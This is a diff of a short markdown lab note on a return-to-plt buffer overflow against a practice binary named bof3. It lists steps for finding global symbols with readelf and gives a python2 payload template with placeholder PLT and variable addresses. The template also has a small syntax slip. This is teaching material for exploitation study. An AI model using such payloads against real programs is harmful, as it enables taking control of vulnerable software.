@@ -1,6 +1,8 @@
 # Buffer Overflow : return to plt
+```
 1. TARGET FILE : bof3 <br>
 2. SORUCE FILE : bof3.c <br>
+```
 
 ***TASK1*** 
 ```
@@ -19,10 +21,12 @@ A.) user readelf tool with -s
 How To) 
 readelf -s bof3 |grep GLOBAL 
 ```
+
 ***TASK3*** 
 ```
 Q.) plt Payloads? 
 A.) Command This 
 
-python2 -c "print 'a'*offset '{plt section function address}'+'BBBB'+'{GLOBAL VARIABLE ADDRESS}'" | ./target_file <br>
+python2 -c "print 'a'*offset '{plt section function address}' \
+        +'BBBB'+'{GLOBAL VARIABLE ADDRESS}'" | ./target_file 
 ```
